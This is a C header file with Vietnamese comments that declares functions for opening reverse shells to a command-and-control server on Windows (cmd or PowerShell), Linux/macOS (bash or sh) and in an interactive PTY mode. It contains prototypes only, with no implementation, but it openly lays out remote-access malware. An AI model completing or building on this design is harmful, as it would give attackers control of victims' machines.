/**
 * remote_shell.h
 * Khai bao prototype cho cac ham reverse shell
 */

#ifndef REMOTE_SHELL_H
#define REMOTE_SHELL_H

#include <stddef.h>

/**
 * Tao reverse shell den server C2
 * Dau vao: server_ip - dia chi IP cua C2 server
 *          server_port - cong cua C2 server
 *          loai_shell - loai shell ("cmd", "bash", "powershell")
 * Tra ve: 0 neu thanh cong, -1 neu that bai
 */
int reverse_shell(const char* server_ip, int server_port, const char* loai_shell);

/**
 * Tao reverse shell tren Windows (cmd.exe hoac powershell.exe)
 * Dau vao: server_ip - dia chi IP cua C2
 *          server_port - cong cua C2
 *          dung_powershell - 1 neu dung PowerShell, 0 neu dung CMD
 * Tra ve: 0 neu thanh cong
 */
int reverse_shell_windows(const char* server_ip, int server_port, int dung_powershell);

/**
 * Tao reverse shell tren Linux/MacOS (/bin/bash hoac /bin/sh)
 * Dau vao: server_ip - dia chi IP cua C2
 *          server_port - cong cua C2
 * Tra ve: 0 neu thanh cong
 */
int reverse_shell_linux(const char* server_ip, int server_port);

/**
 * Tao reverse shell voi PTY (gia lap terminal)
 * Ho tro interactive TTY mode
 */
int reverse_shell_interactive(const char* server_ip, int server_port);

#endif /* REMOTE_SHELL_H */